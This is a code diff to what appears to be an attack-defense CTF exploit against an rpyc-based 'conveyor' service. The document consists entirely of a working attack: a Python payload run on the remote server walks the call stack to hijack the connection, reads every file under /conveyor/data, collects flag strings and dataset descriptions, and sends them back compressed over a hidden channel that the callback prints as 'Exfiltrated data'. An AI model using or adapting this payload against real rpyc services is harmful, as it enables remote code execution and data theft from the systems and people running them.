@@ -43,25 +43,25 @@ rpyc.Channel.COMPRESSION_THRESHOLD = 0  # type: ignore
 
 payload = """
 import inspect
+import re
+import os
+
 stack = inspect.stack()
 handle_call_stack = next(filter(lambda s: s.function == '_handle_call', stack))
 conn = handle_call_stack.frame.f_locals['self']
-remoteroot = conn.root
+send = lambda conn, s: conn._send(2, 1337, conn._box(__import__('zlib').compress(s.encode())))
 
-import re
 flagre = re.compile(b'[A-Z0-9]{31}=')
-
-import os
 for filename in os.listdir('/conveyor/data'):
     with open('/conveyor/data/'+filename, 'rb') as f:
         data = f.read()
     for flag in flagre.findall(data):
-        conn._send(2, 1337, conn._box('file flag ' + flag.decode()))
+        send(conn, 'file flag ' + flag.decode())
 
-for account in remoteroot.data:
+for account in conn.root.data:
     datasets = conn._local_root.repository.list_datasets(account)
     for dataset in datasets:
-        conn._send(2, 1337, conn._box('redis flag ' + dataset.name + ' ' + dataset.description))
+        send(conn, 'redis flag ' + dataset.name + ' ' + dataset.description)
 """
 
 
@@ -69,7 +69,7 @@ for account in remoteroot.data:
 # which will be used for all data exfiltration
 def _seq_request_callback(self, msg, seq, is_exc, obj):
     if seq == 1337:
-        print(f"Exfiltrated data: {obj}")
+        print(f"Exfiltrated data: {zlib.decompress(obj).decode()}")
         return
 
     _callback = self._request_callbacks.pop(seq, None)
